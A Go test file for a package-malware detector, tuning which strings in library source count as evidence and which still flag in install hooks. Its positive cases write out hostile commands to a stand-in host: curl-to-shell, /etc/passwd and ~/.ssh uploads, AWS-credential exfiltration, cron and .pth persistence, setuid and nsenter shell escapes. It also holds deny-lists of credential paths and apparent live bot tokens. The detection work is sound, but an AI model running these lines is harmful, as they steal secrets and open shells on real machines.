package detect

import "testing"

// Pass 11 (2026-10-18). A rescan of mints withdrawn as stale still judged 22 of them malicious
// under the current engine, and every one was a false positive of a rule that treats a STRING in
// library source as if it were an action:
//
//	P-PASSWD-READ  10  path-traversal tests and docstrings: os.path.join(dest, "/etc/passwd")
//	P-CURL-PIPE     5  install hints: {"Linux": "curl -f https://zed.dev/install.sh | sh"}
//	P-EVAL-BASE64   1  prose: "the eval-binding ROOT COMMITMENT (root_b64, a non-empty base64 string)"
//
// Each of these is evidence only where it runs unattended -- an install hook. A library's
// runtime source merely mentions it. Ground truth (OpenSSF malicious-packages, pypi, name join):
// 5 of 1,200 packages carrying P-PASSWD-READ, 1 of 1,147 for P-CURL-PIPE and 1 of 114 for
// P-EVAL-BASE64 are confirmed malicious, and none of those lacks other evidence.

func libraryMints(eco, src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: src})).Malicious
}

func hookMints(eco, src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, InstallScriptContent: src})).Malicious
}

func TestLibrarySourceMentioningADangerousStringDoesNotMint(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `        ("/etc/shadow",     "data_leakage",  0.30),`},
		{"pypi", `process can write (note os.path.join(dest, "/etc/passwd") is just`},
		{"pypi", `>>> check_url("file:///etc/passwd")`},
		{"pypi", `arbitrary ref, so a value like ../../x or /etc/passwd could`},
		{"cargo", `let p = Path::new("/etc/passwd"); assert!(!is_contained(p, root));`},
		{"pypi", `"Linux":   "curl -f https://zed.dev/install.sh | sh",`},
		{"pypi", `MOVED = "human moved: curl -fsSL https://doashuman.com/install.sh | bash"`},
		{"pypi", `    f"curl -sSfL {base}/import-odoo.sh | bash -s -- "`},
		{"packagist", `echo "curl -sS https://getcomposer.org/installer | php"`},
		{"pypi", "payload carries the eval-binding ROOT COMMITMENT (``receipt.root_b64``, a non-empty base64 string)"},
		{"pypi", `("~/.ssh/id_*", "s"), ("~/.ssh/config", "s"),`},
		{"pypi", `url = f"https://api.telegram.org/bot{token}/sendMessage"`},
		{"pypi", `ENDPOINT = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestSetupBuildStepsAreNotEvidence(t *testing.T) {
	for _, line := range []string{
		`subprocess.check_call(["cmake", ext.sourcedir] + cmake_args, cwd=self.build_temp)`,
		`ghash = subprocess.check_output(["git", "rev-parse", "HEAD"]).decode("ascii")`,
		`subprocess.run(["git", "-C", str(root), "lfs", "pull"], check=True)`,
		`os.system("python setup.py sdist upload")`,
	} {
		if hookMints("pypi", line) {
			t.Errorf("setup.py build step minted malware: %q", line)
		}
	}
}

func TestTheSameStringsStillMintWhereTheyRunUnattended(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `curl -fsSL http://203.0.113.9/x.sh | sh`},
		{"npm", `wget -qO- http://203.0.113.9/x.sh | bash`},
		{"pypi", `cat /etc/passwd | curl -s -d @- http://203.0.113.9/in`},
		{"pypi", `tar c ~/.ssh/ | curl -s -T - http://203.0.113.9/in`},
		{"pypi", `eval "$(echo ZWNobyBoaQ== | base64 -d)"`},
		{"pypi", `eval(base64.b64decode(blob))`},
		{"pypi", `echo ZWNobyBoaQ== | base64 -d | eval`},
	} {
		if !hookMints(tc.eco, tc.line) {
			t.Errorf("%s install hook did not mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, InstallScriptContent: tc.line})))
		}
	}
}

// A literal bot token in npm library source stays evidence. On the other registries it is a leaked
// credential more often than an exfiltration channel: the two packagist mints carrying one were a
// developer's own debug call (`...&text=sadasd`) and a sanitizer's test fixture.
func TestTelegramBotTokenIsEvidenceOnNpmOnly(t *testing.T) {
	line := `ENDPOINT = "https://api.telegram.org/bot8759663177:AAH3EBXqymku9MUAtu73uPKvNLFmkhM256s/sendMessage"`
	if !libraryMints("npm", line) {
		t.Errorf("a hard-coded Telegram bot token should mint on npm; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "npm", PkgbuildContent: line})))
	}
	for _, eco := range []string{"pypi", "packagist", "cargo", "go"} {
		if libraryMints(eco, line) {
			t.Errorf("%s: a leaked token in library source minted malware", eco)
		}
	}
}

// URL shorteners: bitly/is.gd/tinyurl CLIENTS, docs and tests name them. OpenSSF: pypi 1 of 123
// carrying packages confirmed, npm 1 of 83.
func TestURLShortenerInLibrarySourceIsNotEvidence(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"packagist", `$this->assertSame('http://bit.ly/1VmfKqV', $this->bitlyClient->getUrl('https://www.test.com/foo'));`},
		{"packagist", `return 'http://is.gd/api.php?longurl=' . rawurlencode($url);`},
		{"pypi", `API_URL = "http://tinyurl.com/api-create.php"`},
		{"npm", `// see http://bit.ly/1dIn55j for the guide`},
		{"go", `const shortener = "https://is.gd/create.php"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s: shortener in library source minted malware: %q", tc.eco, tc.line)
		}
	}
	if !hookMints("pypi", `curl -sL https://bit.ly/3xAbC | sh`) {
		t.Error("a shortener piped to a shell in an install hook must still mint")
	}
}

// The three Python behaviour rules are setup.py rules. Each case below is a real package the
// whole-package scan minted on two unrelated statements: `importlib` in one place and `exec(`
// in another (cxp, cat-agent), and ~/.aws/credentials read for AWS auth in one module with a
// request in another (puppetmaster-ai).
func TestSetupBehavioursDoNotJoinUnrelatedLibraryStatements(t *testing.T) {
	for _, tc := range []struct{ name, src string }{
		{"cxp", "from importlib.metadata import PackageNotFoundError, distribution\nSCRIPT = (\n    f\"names={names}; items={{}}; \"\n    'exec(code)'\n)\n"},
		{"cat-agent", "    r'importlib\\.import_module\\s*\\(',  # dynamic imports via importlib\n]\nmsg = ('Disallowed: importlib.import_module()'\n      )\nexec(code, ns)\n"},
		{"puppetmaster-ai", "\"\"\"Read access key from ``~/.aws/credentials``.\"\"\"\ncreds = open(os.path.expanduser('~/.aws/credentials')).read()\nr = requests.get('https://bedrock.example/v1')\n"},
	} {
		f := Detect(&PackageContext{Name: tc.name, Ecosystem: "pypi", PkgbuildContent: tc.src})
		for _, id := range []string{"PY-SETUP-IMPORTLIB-EXEC", "PY-SETUP-CRED-EXFIL", "PY-PTH-AUTOIMPORT-PERSISTENCE"} {
			if has(f, id) {
				t.Errorf("%s: library source fired %s; findings=%v", tc.name, id, ids(f))
			}
		}
		if CombinedVerdict(f).Malicious {
			t.Errorf("%s: library source minted malware; findings=%v", tc.name, ids(f))
		}
	}
}

func TestSetupBehavioursStillFireInSetupPy(t *testing.T) {
	for _, tc := range []struct{ id, src string }{
		{"PY-SETUP-IMPORTLIB-EXEC", "import importlib; exec(importlib.import_module('p').PAYLOAD)\n"},
		{"PY-SETUP-CRED-EXFIL", "d = open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('https://x.example/c', data=d)\n"},
		{"PY-PTH-AUTOIMPORT-PERSISTENCE", `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")` + "\n"},
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: tc.src})
		if !has(f, tc.id) && !has(f, "IS-"+tc.id) {
			t.Errorf("%s: setup.py content did not fire; findings=%v", tc.id, ids(f))
		}
		if !CombinedVerdict(f).Malicious {
			t.Errorf("%s: setup.py content did not mint; findings=%v", tc.id, ids(f))
		}
	}
}

func TestSetupHostReconIsEvidence(t *testing.T) {
	line := `_host = subprocess.check_output(["hostname"]).decode(errors="replace").strip()`
	if !hookMints("pypi", line) {
		t.Errorf("setup.py fingerprinting the host should mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
	}
	if hookMints("pypi", `subprocess.check_output(["git", "describe", "--tags"])`) {
		t.Error("git describe in setup.py must not mint")
	}
}

// The demotion is per registry, because the measurement is. On npm and rubygems the same strings
// are where the malware sits: of the npm packages carrying them, P-TELEGRAM-BOT 12 of 54,
// P-PASSWD-READ 12 of 120 and G-PIPE-NODE 19 of 26 are OpenSSF-confirmed (pypi: 4%, 0.4%, none).
func TestNpmAndRubygemsKeepTheseAsEvidenceInLibrarySource(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"npm", `const pw = require('fs').readFileSync('/etc/passwd', 'utf8');`},
		{"npm", `fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=1&text=" + env)`},
		{"npm", `require('child_process').exec('curl -s http://203.0.113.9/x | node')`},
		{"npm", `exec("tar c ~/.ssh/ | curl -s -T - http://203.0.113.9/in")`},
		{"rubygems", `system("curl -s http://203.0.113.9/x.sh | sh")`},
		{"rubygems", `File.read("/etc/passwd")`},
	} {
		if !libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line should still mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

// Residuals of the live re-judge of single-rule pypi mints (2026-10-18), one real line each.
func TestLongTailLibraryStringsDoNotMint(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `jwt_body_dict = eval(str(base64.urlsafe_b64decode(jwt_body), "utf-8"))`},
		{"pypi", `suspicious_words = [b"eval(", b"os.system(", b"powershell", b"base64_decode"]`},
		{"pypi", `"if curl -fsS http://127.0.0.1:8092/health >/dev/null 2>&1; then echo health-ok; exit 0; fi; "`},
		{"pypi", `[ -d /mnt/sysroot/dev ] && mount -o bind /dev /mnt/sysroot/dev`},
		{"pypi", `f"send_key_to_tmux: tmux send-keys {key} failed "`},
		{"pypi", `save_ifs=$IFS`},
		{"pypi", `'~/.mozilla/firefox',`},
		{"pypi", `start_commands=[str(bore_bin), 'local', str(port), '--to', 'bore.pub'],`},
		{"pypi", "see https://example.dev/docs com（否则 use the default）"},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestHomographNeedsConfusableScripts(t *testing.T) {
	if libraryMints("pypi", "url = https://com（否则") {
		t.Error("Latin beside Han is not a homograph spoof")
	}
}

// Four go mirrors of the curl project (github.com/curl/curl, bagder/curl, curl/everything-curl,
// perl6-net-curl) were minted on P-INSTALL-CURL: `\s` after `curl` matched the newline ending
// the go.mod `module` line.
func TestInstallCurlIsACommandNotAModuleName(t *testing.T) {
	for _, src := range []string{"module github.com/curl/curl\n\ngo 1.21\n", "module github.com/azawawi/perl6-net-curl\n"} {
		if hookMints("go", src) {
			t.Errorf("a module named curl minted malware: %q", src)
		}
	}
	if !hookMints("go", "curl -fsSL http://203.0.113.9/x.sh | sh\n") {
		t.Error("curl with arguments in an install hook must still mint")
	}
}

// Pass 13: four more strings that library source merely mentions. Real lines from live mints
// (cron-expression parsers, clipboard-tool names in an error, `curl -X POST` in a script or doc,
// a systemd user-unit path). Hook surfaces and npm are not demoted.
func TestCronClipboardPostSystemdAreStringsInLibrarySource(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `"""Parse crontab expression -> (minute, hour, dom, month, dow) sets."""`},
		{"go", `crontab := m.triggerCrontab()`},
		{"packagist", `'crontab' => [`},
		{"pypi", `raise ClipboardError("wl-paste is not installed.")`},
		{"go", `return nil, "", fmt.Errorf("clipboard image paste needs wl-clipboard (Wayland) or xclip (X11) installed")`},
		{"pypi", `curl -sS -X POST "$MCP_UNIFIED_GATEWAY_URL/policy/explain" -d "$BODY"`},
		{"cargo", `curl -s -X POST localhost:8600/api/ticket/1/action/open -H "Authorization: Bearer $TOKEN"`},
		{"pypi", `path = Path.home() / ".config/systemd/user/autohilt-link.service"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestCronPersistenceStillMintsInAnInstallHook(t *testing.T) {
	if !hookMints("pypi", `echo "*/5 * * * * root curl http://203.0.113.9/b" > /etc/cron.d/system-update`) {
		t.Error("writing /etc/cron.d from an install hook must still mint")
	}
}

// Packaging idioms (AUR re-read, 2026-10-18): each line is a real one from a stored advisory, and
// each hostile counterpart must still fire. The lines are PKGBUILD content, which executes.
func pkgbuildMints(line string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})).Malicious
}

func TestPackagingIdiomsAreNotFindings(t *testing.T) {
	for _, line := range []string{
		`chmod 4755 "$pkgdir/opt/brave.com/brave-beta/chrome-sandbox"`,
		`chmod 4755 "${pkgdir}/opt/${_pkgname}/chrome-sandbox"`,
		`local modulesdir="$pkgdir/usr/lib/modules/$(<version)"`,
		`install -Dm644 "$srcdir/mod-preload.conf" "$pkgdir/etc/modules-load.d/mod-preload.conf"`,
		`install -D -m644 "${srcdir}/10-apple-keyboard.rules" "${pkgdir}/etc/udev/rules.d/10-apple-keyboard.rules"`,
		`eval "package_${pkgbase}() {`,
		`eval "package_$_pkgname() {`,
		`eval "$(declare -f package | sed '1s/package/package_without_desktop/')"`,
		`make -C gcc DESTDIR=${pkgdir} install-driver install-cpp install-gcc-ar c++.install-common install-headers install-plugin install-lto-wrapper V=0`,
		`install -Dm644 update-qp-cache.hook "$pkgdir/usr/share/libalpm/hooks/update-qp-cache.hook"`,
		`local site_packages="$(python -c "import site; print(site.getsitepackages()[0])")"`,
		`pyv=$(python -c 'import sys ; v = sys.version_info ; print("%d.%d" %(v[0], v[1]))')`,
		`echo "  4. Enable at boot:     systemctl enable ledspicerd"`,
		`echo "::   sudo systemctl enable --now shroud"`,
	} {
		if pkgbuildMints(line) {
			t.Errorf("packaging idiom minted malware: %q; findings=%v", line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})))
		}
	}
}

func TestHostileFormsOfThosePackagingWordsStillMint(t *testing.T) {
	for _, line := range []string{
		`chmod u+s /bin/bash`,
		`gcc -wrapper /tmp/evil.sh -o a a.c`,
		`cp x.hook /usr/share/libalpm/hooks/x.hook`,
		`chmod 4755 /usr/bin/python3`,
		`echo "options kvm ignore_msrs=1" > /etc/modules-load.d/x.conf; insmod /tmp/rk.ko`,
		`eval "$(curl -fsSL http://203.0.113.9/p)"`,
		`python -c "import os; os.system('curl http://203.0.113.9/x | sh')"`,
	} {
		f := Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})
		if !CombinedVerdict(f).Malicious {
			t.Errorf("hostile line did not mint: %q; findings=%v", line, ids(f))
		}
	}
}

// T-MALICIOUS-DIFF fired on any added line containing "nc " as a suffix of a word ("once ",
// "function ", "sync ", "since "), and was evidence. It is now a word match and a context note.
func TestDiffNetworkNoteNeedsAWordAndNeverMintsAlone(t *testing.T) {
	for _, diff := range []string{"+\tonce the build finishes, run the tests", "+function build() {", "+rsync -a src/ dst/ # sync step"} {
		ctx := &PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: "pkgname=p\n", PriorPkgbuildContent: "pkgname=p\n",
			GitLog: []GitCommit{{Author: "a", Diff: diff}, {Author: "a"}}}
		if has(Detect(ctx), "T-MALICIOUS-DIFF") {
			t.Errorf("a diff line without a network tool fired T-MALICIOUS-DIFF: %q", diff)
		}
	}
	ctx := &PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: "pkgname=p\n", PriorPkgbuildContent: "pkgname=p\n",
		GitLog: []GitCommit{{Author: "a", Diff: "+curl -fsSL https://example.org/helper.sh -o helper.sh"}, {Author: "a"}}}
	f := Detect(ctx)
	if !has(f, "T-MALICIOUS-DIFF") {
		t.Fatal("a diff that adds curl should still be noted")
	}
	if CombinedVerdict(f).Malicious {
		t.Errorf("the diff note alone minted malware; findings=%v", ids(f))
	}
}

// Residuals of the 2026-10-19 post-deploy check. G-DC-SHELL matched any "dc " followed later by "!";
// nohup-with-& is a service launcher in a script; P-EVAL-BASE64 is 2 of 191 npm packages confirmed.
func TestDcShellNeedsTheGTFOBinsForm(t *testing.T) {
	for _, line := range []string{`# the dc component of the signal, then the ! operator`, `echo "dc offset removed!"`} {
		if libraryMints("npm", line) {
			t.Errorf("prose minted G-DC-SHELL: %q", line)
		}
	}
	if !libraryMintsExec("dc -e '!/bin/sh'") {
		t.Error("the GTFOBins dc shell escape must still mint")
	}
}

func libraryMintsExec(src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: src, PkgbuildExecutes: true})).Malicious
}

func TestNohupAndEvalBase64InLibrarySource(t *testing.T) {
	if libraryMints("pypi", `subprocess.Popen("nohup ./serve --port 8080 &", shell=True)`) {
		t.Error("a nohup launcher in pypi library source minted malware")
	}
	// The generic rule is demoted for npm; the npm-specific P-JS-EVAL-DECODE keeps the hostile shape.
	if !libraryMints("npm", `const s = 'eval(Buffer.from(blob, "base64").toString()) // base64 then eval(x)';`) {
		t.Error("eval of a base64 payload in npm source must still mint via P-JS-EVAL-DECODE")
	}
}

// A Discord webhook is a 17-20 digit id and a ~68 character token. The docs placeholders that minted
// pypi advisories (`webhooks/123456/abcdef`, `webhooks/xxxx.../xxxx...`) are not one.
func TestDiscordWebhookNeedsARealWebhookShape(t *testing.T) {
	for _, line := range []string{
		`url = "https://discord.com/api/webhooks/123456/abcdef"`,
		`"placeholder": "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"`,
		`webhook = "https://discord.com/api/webhooks/${ID}/${TOKEN}"`,
	} {
		if libraryMints("pypi", line) {
			t.Errorf("a Discord webhook placeholder minted malware: %q", line)
		}
	}
	real := `WEBHOOK = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"`
	if !libraryMints("pypi", real) {
		t.Errorf("a real-shaped webhook should still mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: real})))
	}
}

// pub.dev's ecosystem string in the engine input is "pub" (internal/pubdev.Ecosystem), not "pubdev".
// Every library-text demotion listed "pubdev", so none applied to pub.dev packages: 109 of 219 advisories
// kept resting on `../../etc/passwd` in a path-traversal test, `curl ... | bash` in an install hint and so on.
func TestPubDevLibraryTextIsDemotedUnderItsRealEcosystemName(t *testing.T) {
	for _, line := range []string{
		`'../../etc/passwd',`,
		`const standaloneInstallCommand = 'curl -sL https://firebase.tools | bash';`,
		`final u = 'https://bit.ly/abc';`,
	} {
		if libraryMints("pub", line) {
			t.Errorf("pub: library line minted malware: %q", line)
		}
	}
}

// P-FILEHOST-SOURCE needs the file host as a host. Real lines from live advisories that matched it as a substring.
func TestFileHostNeedsAHostBoundary(t *testing.T) {
	for _, line := range []string{
		`from wsidicom.file.io.frame_index import OffsetTableType`,
		`PET_PROFILE_ENDPOINT = "https://pet-profile.iothings.site/graphql/"`,
		`clone = state_transfer.shallow_clone(self)`,
		`from navigate.bunker.transfer.shore_power import transfer_shore_power`,
		`await file.io.rename(file.io.uri.resolve('new_file.txt').toFilePath());`,
		`shallow: [...transfer.shallow],`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
		if has(f, "P-FILEHOST-SOURCE") {
			t.Errorf("a substring of a file host matched P-FILEHOST-SOURCE: %q", line)
		}
	}
	for _, line := range []string{
		`url = "https://transfer.sh/abc/payload.sh"`,
		`curl -sL https://file.io/xyz -o p`,
		`url = f"https://www.mediafire.com/file/{mf_url}"`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
		if !has(f, "P-FILEHOST-SOURCE") {
			t.Errorf("a real file-host URL should still match: %q; findings=%v", line, ids(f))
		}
	}
}

func TestPastebinNeedsAHostBoundary(t *testing.T) {
	for _, line := range []string{`homepage: https://www.coralogix.io/`, `private $base = "https://sonar.fonix.io/v2/";`} {
		if has(Detect(&PackageContext{Name: "p", Ecosystem: "pub", PkgbuildContent: line}), "P-PASTEBIN") {
			t.Errorf("a host that merely ends in ix.io matched P-PASTEBIN: %q", line)
		}
	}
	for _, line := range []string{`url = "https://pastebin.com/raw/SXvsjf5t"`, `curl https://ix.io/abc | sh`, `fetch("https://www.hastebin.com/raw/x")`} {
		if !has(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}), "P-PASTEBIN") {
			t.Errorf("a real paste host should still match: %q", line)
		}
	}
}

// Audited pypi disputes (2026-10): every line below minted, or carried, a malware advisory that a
// review found to be a docstring, a fixture, README text, a deny-list, test vectors, a risk-score
// keyword list, a public constant, the tool's own job, or a usage placeholder. None may mint from a
// pypi library's runtime source.
func TestAuditedPypiDisputesDoNotMintInLibrarySource(t *testing.T) {
	for _, tc := range []struct{ name, src string }{
		{"docstring curl|sh", "def install():\n    \"\"\"Install the CLI first:\n\n        !curl -fsSL https://get.example-tool.dev/install.sh | sh\n    \"\"\"\n    return None\n"},
		{"onnx fixture", "    model = make_model(\n        external_paths=(\"../../etc/passwd\",),\n    )\n"},
		{"readme ssh key", "identity_file: ~/.ssh/raspberry_pi_key\n"},
		{"hook deny-list", "DENY_READ = [\"~/.aws/credentials\", \"~/.ssh/**\", \"~/.netrc\"]\n"},
		{"test vectors", "DANGEROUS = (\n    \"nohup env\",\n    \"echo $GITHUB_TOKEN\",\n    \"echo x | xargs env\",\n)\n"},
		{"varden risky_domains", "risky_domains = ['pastebin', 'ngrok', 'transfer.sh', 'file.io', 'anonfiles.com']\n"},
		{"secp256k1 n", "_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n"},
		{"burn address", "BURN = \"0x000000000000000000000000000000000000dEaD\"\n"},
		{"usdc base", "USDC_BASE = \"0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913\"\n"},
		{"nsenter in netns tool", "    cmd = f\"nsenter -t $TPID -n ip addr add {addr} dev {ifname}\"\n"},
		{"nsenter bare", "nsenter -t $TPID -n ip addr add 10.0.0.2/24 dev eth0\n"},
		{"xargs sh -c helper", "SCRIPT = \"find . -name '*.pyc' | xargs -I{} sh -c 'rm {}'\"\n"},
		{"placeholder host", "    \"\"\"Usage: signal-hunt https://<домен-signal-hunt>/api\"\"\"\n"},
		{"placeholder host in code", "print(\"usage: signal-hunt https://<домен-signal-hunt>/api\")\n"},
		{"refusal list", "REFUSE = [\n    \"file:///etc/passwd\",\n    \"http://169.254.169.254/latest/meta-data/\",\n]\n"},
	} {
		f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: tc.src})
		if CombinedVerdict(f).Malicious {
			t.Errorf("%s: library source minted malware; evidence=%v", tc.name, ids(Evidence(f)))
		}
	}
}

// The same strings where they run unattended (setup.py, an install hook) are still evidence.
func TestAuditedStringsStillMintInAnInstallHook(t *testing.T) {
	for _, line := range []string{
		`curl -fsSL http://203.0.113.9/x.sh | sh`,
		`nsenter -t 1 -m -u -i -n sh -c 'id'`,
		`find / -name id_rsa | xargs -I{} sh -c 'curl -T {} http://203.0.113.9/'`,
	} {
		if !hookMints("pypi", line) {
			t.Errorf("install hook did not mint: %q; findings=%v", line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
		}
	}
	// The demoted rules stay evidence in content that executes.
	executing := func(line string) []Finding {
		return Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: line, PkgbuildExecutes: true})
	}
	for _, tc := range []struct{ id, line string }{
		{"G-NSENTER", `nsenter -t 1 -m -u -i -n sh -c 'id'`},
		{"G-XARGS-SHELL", `find / -name id_rsa | xargs -I{} sh -c 'curl -T {} http://203.0.113.9/'`},
		{"P-FILEHOST-SOURCE", `curl -sL https://transfer.sh/abc/payload.sh -o /tmp/p`},
		{"P-CRYPTO-WALLET", `WALLET = "0x52908400098527886E0F7030069857D2E4169EE7"`},
	} {
		if !has(Evidence(executing(tc.line)), tc.id) {
			t.Errorf("%s: not evidence in executing content: %q; findings=%v", tc.id, tc.line, ids(executing(tc.line)))
		}
	}
	// A public constant is not a wallet, even where it would execute.
	for _, line := range []string{
		`ZERO = "0x0000000000000000000000000000000000000000"`,
		`USDC = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"`,
		`USDT_ARB = "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9"`,
	} {
		if has(executing(line), "P-CRYPTO-WALLET") {
			t.Errorf("a well-known constant matched P-CRYPTO-WALLET: %q", line)
		}
	}
	if !has(executing(`pay("0x000000000000000000000000000000000000dEaD", "0x52908400098527886E0F7030069857D2E4169EE7")`), "P-CRYPTO-WALLET") {
		t.Error("a line with a constant AND an unknown address must keep the finding")
	}
}

// A real mixed-script host is still a spoof; a placeholder or a comment is not.
func TestHomographNeedsARealHostOnAnExecutableLine(t *testing.T) {
	if !libraryMints("pypi", `URL = "https://іnstall.example-clі.dev/payload.sh"`) {
		t.Error("a Cyrillic/Latin mixed host in a URL must still mint")
	}
	for _, line := range []string{
		`# fetched from https://іnstall.example-clі.dev/payload.sh in the old release`,
		`url = "https://<домен-signal-hunt>/api"`,
		`url = f"https://{хост}.example/api"`,
		`url = "https://дом-host/api"`,
	} {
		if libraryMints("pypi", line) {
			t.Errorf("not a spoofed host, but minted: %q", line)
		}
	}
}

// A pypi library's docstrings, comments and string-literal lists are not actions; executable
// lines are. The Discord webhook rule is evidence in pypi library source, so it shows the effect.
func TestPythonDocstringsCommentsAndDataListsAreNotEvidence(t *testing.T) {
	const hook = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
	const hook2 = "https://discord.com/api/webhooks/1547416857537945602/UgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
	for _, src := range []string{
		"\"\"\"Module docs.\n\nPost to " + hook + "\n\"\"\"\nimport os\n",
		"class C:\n    '''Example: " + hook + "'''\n    pass\n",
		"def f(): \"\"\"" + hook + "\"\"\"\n",
		"x = 1  # see " + hook + "\n",
		"KNOWN_BAD = [\n    \"" + hook + "\",\n    \"" + hook2 + "\",\n]\n",
		"KNOWN_BAD = {\"" + hook + "\", \"" + hook2 + "\"}\n",
	} {
		if libraryMints("pypi", src) {
			t.Errorf("documentation or data minted malware:\n%s\nfindings=%v", src, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})))
		}
	}
	for _, src := range []string{
		"WEBHOOK = \"" + hook + "\"\n",
		"requests.post(\"" + hook + "\", json=data)\n",
		"requests.post(*[\"" + hook + "\", \"" + hook2 + "\"])\n",
		"URLS = [\"" + hook + "\", \"" + hook2 + "\"]\nrequests.post(\"" + hook + "\")\n",
		"exec(__doc__)\n\"\"\"" + hook + "\"\"\"\n",
		"f\"\"\"{requests.post('" + hook + "')}\"\"\"\n",
		"S = \"\"\"" + hook + "\"\"\"\n",
		"URLS = [\"" + hook + "\", WEBHOOK_BASE + \"x\"]\n",
	} {
		if !libraryMints("pypi", src) {
			t.Errorf("an executable or ambiguous line no longer mints:\n%s\nfindings=%v", src, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src})))
		}
	}
	// setup.py inside the concatenated sources is install-time code: never rewritten.
	src := "\n# ==== pkg-1.0/setup.py ====\n\"\"\"" + hook + "\"\"\"\n\n# ==== pkg-1.0/pkg/__init__.py ====\n\"\"\"" + hook + "\"\"\"\n"
	if !libraryMints("pypi", src) {
		t.Error("a docstring in setup.py must not be blanked")
	}
	// Other ecosystems are untouched.
	if !libraryMints("npm", "/** "+hook+" */\nconst x = `\"\"\""+hook+"\"\"\"`;\n") {
		t.Error("the Python views must not apply to npm")
	}
}

// An argv list is a command, not data.
func TestArgvListsAreNotDemoted(t *testing.T) {
	src := "CMD = [\"bash\", \"-c\", \"nsenter -t 1 -m -u -i -n sh\"]\n"
	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: src, PkgbuildExecutes: true})
	if !CombinedVerdict(f).Malicious {
		t.Errorf("control: an executing recipe must mint; findings=%v", ids(f))
	}
	if !pyArgvTokens["-c"] || !pyArgvTokens["bash"] {
		t.Fatal("argv tokens missing")
	}
	_, exec := pythonLibraryViews(src)
	if exec != src {
		t.Errorf("an argv list was blanked:\n%q", exec)
	}
}

// A single evidence finding in non-executing library content is a low-fidelity verdict: it still
// mints, but is not eligible for automatic approval.
func TestSingleLibraryIndicatorIsLowFidelity(t *testing.T) {
	const hook = "https://discord.com/api/webhooks/1547416857537945601/TgPFykvLraAjc6jAPKzekhmkUABmEEehsrKHIX8tG3urtKVl40uXyZabcdefghijklmnopqrstuvwxy"
	lib := "WEBHOOK = \"" + hook + "\"\n"
	v := CombinedVerdict(Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: lib}))
